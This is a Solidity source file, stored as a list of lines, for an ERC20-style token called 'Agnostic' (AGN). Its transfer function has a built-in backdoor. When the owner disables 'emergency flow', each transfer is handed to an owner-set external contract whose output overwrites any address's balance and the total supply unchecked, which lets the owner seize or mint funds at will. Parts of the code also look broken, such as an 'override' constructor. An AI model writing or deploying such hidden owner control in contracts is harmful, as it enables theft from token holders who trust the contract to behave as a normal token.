['pragma solidity 0.6.0;\n', '\n', 'library SafeMath {\n', '\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    if (a == 0) {\n', '        return 0;\n', '    }\n', '\n', '    uint256 c = a * b;\n', '    require(c / a == b);\n', '\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    require(b > 0);\n', '    uint256 c = a / b;\n', '\n', '    return c;\n', '  }\n', '\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    require(b <= a);\n', '    uint256 c = a - b;\n', '\n', '    return c;\n', '  }\n', '\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    require(c >= a);\n', '\n', '    return c;\n', '  }\n', '\n', '  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    require(b != 0);\n', '    return a % b;\n', '  }\n', '}\n', '\n', 'contract Ownable {\n', '  address public _owner;\n', '\n', '  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\n', '  constructor () public {\n', '    _owner = msg.sender;\n', '    emit OwnershipTransferred(address(0), msg.sender);\n', '  }\n', '\n', '  function owner() public view returns (address) {\n', '    return _owner;\n', '  }\n', '\n', '  modifier onlyOwner() {\n', '    require(_owner == msg.sender, "Ownable: caller is not the owner");\n', '    _;\n', '  }\n', '\n', '  function renounceOwnership() public virtual onlyOwner {\n', '    emit OwnershipTransferred(_owner, address(0));\n', '    _owner = address(0);\n', '  }\n', '\n', '  function transferOwnership(address newOwner) public virtual onlyOwner {\n', '    require(newOwner != address(0), "Ownable: new owner is the zero address");\n', '    emit OwnershipTransferred(_owner, newOwner);\n', '    _owner = newOwner;\n', '  }\n', '}\n', '\n', 'abstract contract Tokenomics {\n', '  function transferProxy(\n', '      address[] memory addressProps,\n', '      uint256[] memory _passProxyProps) \n', '      virtual public payable returns (address[] memory returnAddress, uint256[] memory returnProxyPros, uint256 longOfReturn);\n', '}\n', '\n', 'abstract contract Governance {\n', '  function getLastGovernanceContract() virtual public view returns (address _question);\n', '}\n', '\n', 'abstract contract Token {\n', '  function transfer(address _to, uint256 _value) virtual public returns (bool success);\n', '  function balanceOf(address _owner) virtual pure public returns (uint256 balance);\n', '  function transferFrom(address _from, address _to, uint256 _value) virtual public returns (bool success);\n', '}\n', '\n', 'contract Agnostic is Ownable {\n', '  using SafeMath for uint256;\n', '\n', '  string public constant name = "Agnostic";\n', '  string public constant symbol = "AGN";\n', '  uint256 public constant decimals = 18;\n', '  uint256 private constant _maximumSupply = 100000 * 10 ** decimals;\n', '\n', '  event Transfer(address indexed from, address indexed to, uint256 value);\n', '  event Approval(address indexed owner, address indexed spender, uint256 value);\n', '\n', '  bool public isEmergencyFlow;\n', '  bool public isGovernanceBlocked;\n', '  address public governanceAddress;\n', '  uint256 public _totalSupply;\n', '  mapping(address => uint256) public _balanceOf;\n', '  mapping(address => mapping(address => uint256)) public allowance;\n', '\n', '  constructor() public override {\n', '    _owner = msg.sender;\n', '    _totalSupply = _maximumSupply;\n', '    _balanceOf[msg.sender] = _maximumSupply;\n', '    emit Transfer(address(0), msg.sender, _maximumSupply);\n', '    isEmergencyFlow = true;\n', '  }\n', '\n', '  function totalSupply () public view returns (uint256) {\n', '    return _totalSupply; \n', '  }\n', '\n', '  function balanceOf (address who) public view returns (uint256) {\n', '    return _balanceOf[who];\n', '  }\n', '  \n', '  // Emergency Flow\n', '  function emergencyFlow (bool setEmergencyFlow) public onlyOwner returns (bool success) {\n', '    isEmergencyFlow = setEmergencyFlow;\n', '    return true;\n', '  }\n', '  \n', '  // Block Governance Forver !!!\n', '  function blockGovernanceForever () public onlyOwner returns (bool success) {\n', '    isGovernanceBlocked = true;\n', '    return true;\n', '  }\n', '  \n', '  // Set Governance Address\n', '  function setGovernanceAddress (address _governanceAddress) public onlyOwner returns (bool success) {\n', '    require(!isGovernanceBlocked);\n', '    governanceAddress = _governanceAddress;\n', '    return true;\n', '  }\n', '\t\n', '  function _transfer(address _from, address _to, uint256 _value) internal {\n', '      \n', '      require(balanceOf(_from) >= _value);\n', '      \n', '      if(isEmergencyFlow)\n', '      {\n', '        _balanceOf[_from] = _balanceOf[_from].sub(_value);\n', '        _balanceOf[_to] = _balanceOf[_to].add(_value);\n', '        emit Transfer(_from, _to, _value);\n', '      }\n', '      else\n', '      {\n', '        address[] memory _passAddressProps = new address[](3);\n', '        \n', '        _passAddressProps[0] = _from;\n', '        _passAddressProps[1] = _to;\n', '        _passAddressProps[2] = address(this);\n', '        \n', '        uint256[] memory _passProxyProps = new uint256[](5);\n', '        \n', '        _passProxyProps[0] = _balanceOf[_from];\n', '        _passProxyProps[1] = _balanceOf[_to];\n', '        _passProxyProps[2] = _balanceOf[address(this)];\n', '           \n', '        _passProxyProps[3] = _value;\n', '        _passProxyProps[4] = _totalSupply;\n', '        \n', '         (address[] memory returnAddress, uint256[] memory transferProxyProps, uint256 longOfReturn) = \n', '              Tokenomics(Governance(governanceAddress).getLastGovernanceContract()).transferProxy(_passAddressProps, _passProxyProps);\n', '    \n', '        for (uint256 i=0; i < longOfReturn-2; i++) {\n', '             _balanceOf[returnAddress[i]] = transferProxyProps[i];\n', '        }\n', '         \n', '        uint256 valueTransfered = transferProxyProps[longOfReturn-2];\n', '        _totalSupply = transferProxyProps[longOfReturn-1];\n', '        \n', '        emit Transfer(_from, _to, valueTransfered);\n', '      }\n', '  }\n', '\n', '  function transfer(address _to, uint256 _value) public returns (bool success) {\n', '    require(_balanceOf[msg.sender] >= _value);\n', '    _transfer(msg.sender, _to, _value);\n', '    return true;\n', '  }\n', '\n', '  function approve(address _spender, uint256 _value) public returns (bool success) {\n', '    require(_spender != address(0));\n', '    allowance[msg.sender][_spender] = _value;\n', '    emit Approval(msg.sender, _spender, _value);\n', '    return true;\n', '  }\n', '\n', '  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '      require(_value <= _balanceOf[_from]);\n', '      require(_value <= allowance[_from][msg.sender]);\n', '      allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);\n', '      _transfer(_from, _to, _value);\n', '      return true;\n', '  }\n', '\n', '  // Burn Tokens\n', '  function burn (uint256 _burnAmount) public onlyOwner returns (bool success) {\n', '    _transfer(_owner, address(0), _burnAmount);\n', '    _totalSupply = _totalSupply.sub(_burnAmount);\n', '    return true;\n', '  }\n', '  \n', '  // Wrong Send AGN\n', '  function returnFromContract() public onlyOwner returns (bool success) {\n', '\t  _transfer(address(this), _owner, _balanceOf[address(this)]);\n', '\t  return true;\n', '  }\n', '\n', '  // Wrong Send Various Tokens\n', '  function returnVariousTokenFromContract(address tokenAddress) public onlyOwner returns (bool success) {\n', '      Token token = Token(tokenAddress);\n', '      token.transfer(msg.sender, token.balanceOf(address(this)));\n', '      return true;\n', '  }\n', '  \n', '  // Wrong Send ETH\n', '  function returnETHFromContract(uint256 value) public onlyOwner returns (bool success) {\n', '      msg.sender.transfer(value);\n', '      return true;\n', '  }\n', '}']